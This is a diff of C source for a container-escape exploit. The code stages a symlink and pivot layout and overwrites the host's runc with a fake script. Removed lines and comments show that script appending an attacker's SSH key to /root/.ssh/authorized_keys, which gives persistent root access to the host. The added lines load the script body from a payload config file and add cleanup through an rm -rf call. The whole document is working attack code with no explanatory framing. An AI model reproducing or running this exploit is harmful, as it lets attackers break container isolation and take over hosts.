@@ -26,7 +26,7 @@
 #define KEY_EXIT_QUIET_MS    "EXIT_QUIET_MS"
 #define KEY_SSH_KEY          "SSH_KEY"
 
-#define CONFIG_FILE "payload_scripts.txt"
+#define CONFIG_FILE "/app/pluginmanager/plugins/escape_script/payload_scripts.txt"
 #define MAX_VAL     2048
 #define MAX_LINE    4096
 
@@ -237,6 +237,100 @@ static void write_repeat_file(const char *path, char fill, size_t size)
 /* ── exploit stages ──────────────────────────────────────────────────────── */
 
 /*
+ * Recursively removes a directory and all its contents.
+ * Used to clean up stale pivot/backup dirs from a previous run.
+ * Only removes directories — does not follow symlinks outside the tree.
+ */
+static void rmdir_recursive(const char *path)
+{
+    char cmd[PATH_MAX * 2];
+
+    /* Use /bin/rm -rf — acceptable here because we control the paths
+     * and this runs inside the attacker's container, not the host. */
+    if (snprintf(cmd, sizeof(cmd), "/bin/rm -rf '%s'", path) >= (int)sizeof(cmd)) {
+        fprintf(stderr, "WARN: path too long to remove: %s\n", path);
+        return;
+    }
+    if (system(cmd) != 0) {
+        fprintf(stderr, "WARN: failed to remove %s\n", path);
+    }
+}
+
+/*
+ * Removes all stale filesystem state from a previous run so that
+ * setup_layout() can recreate everything cleanly.
+ *
+ * Handles:
+ *   - stage_link  : symlink — unlink() removes it regardless of target
+ *   - backup_dir  : leftover from a previous successful pivot — rmdir
+ *   - pivot_dir   : leftover if previous run was interrupted — rmdir
+ *   - trigger_file: overwritten by write_repeat_file (O_TRUNC) — no action
+ *   - backing_file: overwritten by write_text_file (O_TRUNC) — no action
+ */
+static void cleanup_layout(void)
+{
+    struct stat st;
+
+    /* ── NEW: if visible_file exists as a regular file, remove it
+     * so mkdir_p can create it as a directory ─────────────────────────── */
+    if (lstat(cfg.visible_file, &st) == 0) {
+        if (S_ISREG(st.st_mode)) {
+            /* it's a regular file — remove it so we can mkdir */
+            if (unlink(cfg.visible_file) != 0) {
+                fprintf(stderr,
+                    "ERROR: cannot remove existing file at visible_file "
+                    "'%s': %s\n",
+                    cfg.visible_file, strerror(errno));
+                exit(1);
+            }
+            printf("[cleanup] removed regular file: %s "
+                   "(will be replaced with directory)\n",
+                   cfg.visible_file);
+
+        } else if (S_ISDIR(st.st_mode)) {
+            /* already a directory — leave it, mkdir_p handles exist */
+            printf("[cleanup] visible_file already a directory: %s\n",
+                   cfg.visible_file);
+        }
+    }
+
+    /* stage_link */
+    if (lstat(cfg.stage_link, &st) == 0) {
+        if (unlink(cfg.stage_link) != 0) {
+            fprintf(stderr, "WARN: could not remove stage_link %s: %s\n",
+                    cfg.stage_link, strerror(errno));
+        } else {
+            printf("[cleanup] removed stage_link: %s\n", cfg.stage_link);
+        }
+    }
+
+    /* backup_dir */
+    if (lstat(cfg.backup_dir, &st) == 0) {
+        if (S_ISDIR(st.st_mode)) {
+            rmdir_recursive(cfg.backup_dir);
+            printf("[cleanup] removed backup_dir: %s\n", cfg.backup_dir);
+        } else {
+            unlink(cfg.backup_dir);
+            printf("[cleanup] removed stale file at backup_dir: %s\n",
+                   cfg.backup_dir);
+        }
+    }
+
+    /* pivot_dir */
+    if (lstat(cfg.pivot_dir, &st) == 0) {
+        if (S_ISDIR(st.st_mode)) {
+            rmdir_recursive(cfg.pivot_dir);
+            printf("[cleanup] removed pivot_dir: %s\n", cfg.pivot_dir);
+        } else {
+            unlink(cfg.pivot_dir);
+            printf("[cleanup] removed stale file at pivot_dir: %s\n",
+                   cfg.pivot_dir);
+        }
+    }
+
+    fflush(stdout);
+}
+/*
  * Builds the fake runc script from the SSH key read from config.
  * The script appends the attacker's public key to /root/.ssh/authorized_keys
  * then removes itself and restores the real runc — called once by the
@@ -245,11 +339,7 @@ static void write_repeat_file(const char *path, char fill, size_t size)
 static void build_fake_runc(char *out, size_t outlen)
 {
     snprintf(out, outlen,
-        "#!/bin/bash\n"
-        "mkdir -p /root/.ssh\n"
-        "echo '%s' >> /root/.ssh/authorized_keys\n"
-        "chmod 700 /root/.ssh\n"
-        "chmod 600 /root/.ssh/authorized_keys\n",
+        "%s",
         cfg.ssh_key);
 }
 
@@ -257,9 +347,17 @@ static void setup_layout(void)
 {
     char fake_runc[MAX_VAL * 2];
 
+    /* Remove stale state from any previous run before recreating.
+     * write_text_file and write_repeat_file use O_TRUNC so they
+     * overwrite existing files automatically — only dirs and the
+     * symlink need explicit cleanup. */
+    cleanup_layout();
+
     mkdir_p(cfg.pivot_dir,        0755);
     mkdir_p(cfg.host_target_dir,  0755);
 
+    /* backing_file and trigger_file use O_TRUNC — safe to call even
+     * if the files already exist from a previous run */
     write_text_file(cfg.backing_file, "top-level file\n");
     write_repeat_file(cfg.trigger_file, 'B', 16 * 1024 * 1024);
 
@@ -267,6 +365,9 @@ static void setup_layout(void)
     write_text_file(cfg.host_target_file, fake_runc);
 
     if (chmod(cfg.host_target_file, 0755) != 0) die("chmod");
+
+    /* symlink — stage_link was removed by cleanup_layout so this
+     * will always succeed on a clean slate */
     if (symlink(cfg.host_target_dir, cfg.stage_link) != 0) die("symlink");
 
     printf("[setup] layout ready\n");
